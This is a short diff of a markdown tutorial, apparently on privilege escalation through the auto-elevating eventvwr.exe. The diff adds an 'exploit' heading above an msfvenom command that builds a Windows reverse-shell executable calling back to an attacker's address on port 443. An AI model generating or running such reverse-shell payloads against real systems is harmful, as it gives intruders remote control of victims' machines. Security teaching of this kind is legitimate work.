@@ -37,6 +37,8 @@ strings64.exe -accepteula C:\\Windows\\System32\\eventvwr.exe | findstr /i autoe
 
 We can see the value is set to True.
 
+## Making of an Exploit
+
 Now on Atacker machine generate msfvenom payload:
 ```markdown
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 -f exe > shell.exe
